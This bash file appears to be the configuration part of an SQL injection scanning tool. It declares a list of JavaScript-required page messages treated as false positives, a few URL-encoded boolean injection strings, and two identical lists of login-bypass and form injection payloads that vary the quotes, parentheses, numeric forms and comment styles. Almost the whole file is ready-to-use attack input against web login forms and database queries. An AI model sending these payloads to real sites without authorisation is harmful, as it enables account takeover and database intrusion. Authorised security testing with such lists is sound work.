#!/bin/bash
declare -a falsePositiveResponse=(
    "You need to enable JavaScript to run this app"
    "Please enable JavaScript"
    "JavaScript is required"
    "enable javascript"
    "requires JavaScript"
    "This application requires JavaScript"
    "JavaScript must be enabled"
    "Please turn on JavaScript"
)
#
declare -a payloads=(

  # Standard boolean injections
  "1%20AND%201=1--%20-"
  "1%20AND%202=1--%20-"
  "1%20OR%201=1--%20-"

)

declare -a loginPayloads=(
    # Basic payloads
    "' OR '1'='1'-- -"
    "' OR 1=1-- -"
    "' OR 'a'='a'-- -"
    
    # Different quotes
    "\" OR \"1\"=\"1\"-- -"
    "\` OR \`1\`=\`1\`-- -"
    
    # Parentheses
    "') OR '1'='1'-- -"
    "') OR ('1'='1'-- -"
    "')) OR (('1'='1'-- -"
    
    # Numeric
    "1 OR 1=1-- -"
    "1) OR (1=1-- -"
    
    # Boolean false
    "' AND '1'='2'-- -"
    "' OR 1=2-- -"
    
    # Comment variations
    "' OR '1'='1'#"
    "' OR 1=1#"
    "' OR '1'='1'/*"
)

declare -a sqliFormPayloads=(
      # Basic payloads
    "' OR '1'='1'-- -"
    "' OR 1=1-- -"
    "' OR 'a'='a'-- -"
    
    # Different quotes
    "\" OR \"1\"=\"1\"-- -"
    "\` OR \`1\`=\`1\`-- -"
    
    # Parentheses
    "') OR '1'='1'-- -"
    "') OR ('1'='1'-- -"
    "')) OR (('1'='1'-- -"
    
    # Numeric
    "1 OR 1=1-- -"
    "1) OR (1=1-- -"
    
    # Boolean false
    "' AND '1'='2'-- -"
    "' OR 1=2-- -"
    
    # Comment variations
    "' OR '1'='1'#"
    "' OR 1=1#"
    "' OR '1'='1'/*"

)